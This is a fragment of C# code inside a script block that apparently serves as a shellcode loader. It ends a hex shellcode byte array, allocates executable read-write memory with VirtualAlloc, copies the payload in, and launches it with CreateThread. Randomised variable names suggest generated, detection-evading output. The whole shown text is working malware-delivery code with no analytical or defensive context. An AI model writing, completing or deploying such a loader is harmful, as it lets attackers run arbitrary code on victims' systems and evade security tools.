...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr sA3ScquD = VirtualAlloc(IntPtr.Zero,(UIntPtr)oYK.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(oYK,0,sA3ScquD,oYK.Length);
        IntPtr exCJ29vxEwV = IntPtr.Zero;
        IntPtr bMLf98 = CreateThread(IntPtr.Zero,UIntPtr.Zero,sA3ScquD,IntPtr.Zero,0,ref exCJ29vxEwV);
    }
</script>
